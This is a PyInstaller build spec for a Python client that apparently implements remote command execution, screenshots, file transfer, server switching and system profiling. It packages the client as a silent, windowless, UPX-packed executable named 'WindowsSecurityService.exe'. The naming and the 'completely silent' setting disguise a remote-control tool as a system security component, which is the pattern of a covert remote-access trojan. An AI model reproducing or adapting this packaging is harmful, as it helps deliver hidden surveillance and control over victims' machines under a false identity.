# -*- mode: python ; coding: utf-8 -*-
# PyInstaller spec file — build with: pyinstaller client.spec
#
# Output: dist/WindowsSecurityService.exe
# Run:    pyinstaller client.spec

import sys
from pathlib import Path

block_cipher = None

a = Analysis(
    ['client/main.py'],
    pathex=[str(Path('.').resolve())],
    binaries=[],
    datas=[
        ('client/config.yaml', 'client'),
        ('shared', 'shared'),
        ('server', 'server'),      # auth module needed at runtime
    ],
    hiddenimports=[
        'client.commands.execute',
        'client.commands.screenshot',
        'client.commands.file_transfer',
        'client.commands.change_server',
        'client.commands.sysinfo',
        'websockets',
        'cryptography',
        'yaml',
        'mss',
        'PIL',
        'psutil',
        'winreg',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['tkinter', 'unittest', 'test'],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='WindowsSecurityService',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,          # No console window — completely silent
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    # icon='client/assets/icon.ico',   # uncomment and add .ico to use custom icon
    version_file=None,
)
